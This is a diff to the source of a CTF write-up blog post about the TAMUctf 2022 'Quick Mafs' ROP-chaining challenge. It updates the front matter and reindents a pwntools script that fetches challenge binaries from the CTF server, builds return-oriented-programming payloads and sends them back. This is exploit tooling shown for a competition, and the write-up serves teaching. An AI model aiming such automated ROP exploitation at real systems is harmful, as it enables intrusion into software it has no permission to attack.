@@ -1,8 +1,9 @@
 ---
 title: TAMUctf 2022 – Quick Mafs
 description: ROP chaining on steroids.
-updated: "2022-08-07"
+updated: "2022-08-08"
 tags: ctf reverse writeup pwn python
+thumbnail: /assets/img/posts/ctf/inspector-gadget.jpeg
 usemathjax: true
 ---
 
@@ -206,36 +207,36 @@ from solve import solve
 context.log_level = 'debug'
 
 def pwn():
-	p = remote("tamuctf.com", 443, ssl=True, sni="quick-mafs")
+    p = remote("tamuctf.com", 443, ssl=True, sni="quick-mafs")
 
-	for _ in range(5):
-		instructions = p.recvline() # the server will give you instructions as to what your exploit should do
-		bites = p.recvline().rstrip()
+    for _ in range(5):
+        instructions = p.recvline() # the server will give you instructions as to what your exploit should do
+        bites = p.recvline().rstrip()
 
         # Error (wrong answer, or connection was closed).
-		if bites.startswith(b'sorry') or bites.startswith(b'Traceback'):
-			break
+        if bites.startswith(b'sorry') or bites.startswith(b'Traceback'):
+            break
 
         # Save bytes to a file.
-		with open("elf", "wb") as file:
-			file.write(bytes.fromhex(bites.decode()))
+        with open("elf", "wb") as file:
+            file.write(bytes.fromhex(bites.decode()))
 
-		print(f'{instructions=}')
+        print(f'{instructions=}')
 
         # Parse input and get target value.
-		m = re.search(r'call print\(\) with rax = 0x([0-9a-f]+)', instructions.decode())
-		target = int(m.group(1), 16)
-		print(f'{target=:#x}')
+        m = re.search(r'call print\(\) with rax = 0x([0-9a-f]+)', instructions.decode())
+        target = int(m.group(1), 16)
+        print(f'{target=:#x}')
 
-		payload = solve(target, gadget_limit=20)
-		p.sendline(payload.hex().encode())
+        payload = solve(target, gadget_limit=20)
+        p.sendline(payload.hex().encode())
 
-	p.interactive()
+    p.interactive()
 
 try:
-	pwn()
+    pwn()
 except EOFError:
-	pass
+    pass
 ```
 
 ```py
